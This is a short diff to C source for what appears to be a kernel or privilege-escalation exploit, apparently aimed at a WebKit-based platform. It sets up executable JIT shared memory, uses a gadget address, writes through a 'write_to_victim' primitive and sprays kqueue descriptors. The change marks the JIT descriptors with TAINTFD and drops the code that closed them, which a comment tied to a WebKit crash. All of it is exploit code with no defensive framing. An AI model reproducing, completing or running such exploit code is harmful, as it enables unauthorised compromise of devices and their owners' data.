@@ -488,7 +488,9 @@ int main()
     int jit1, jit2;
     errno = 0;
     jit1 = jitshm_create(0, 16384, PROT_READ|PROT_WRITE|PROT_EXEC);
+    TAINTFD(jit1);
     jit2 = jitshm_alias(jit1, PROT_READ|PROT_WRITE);
+    TAINTFD(jit2);
     printf("jit: %d %d\n", jit1, jit2);
     char* page_rx = mmap(NULL, 16384, PROT_READ|PROT_EXEC, MAP_SHARED, jit1, 0);
     thread_0x130_0x68 &= ~__builtin_gadget_addr("dq 0x2000000000000000");
@@ -523,9 +525,6 @@ int main()
     write_to_victim(&o, 0);
     for(int i = 0; i < 256; i++)
         close(kq[i]);
-    // fix crash in webkit after running this
-    close(jit1);
-    close(jit2);
     if(!fork())
     {
         struct sigaction ignore = {
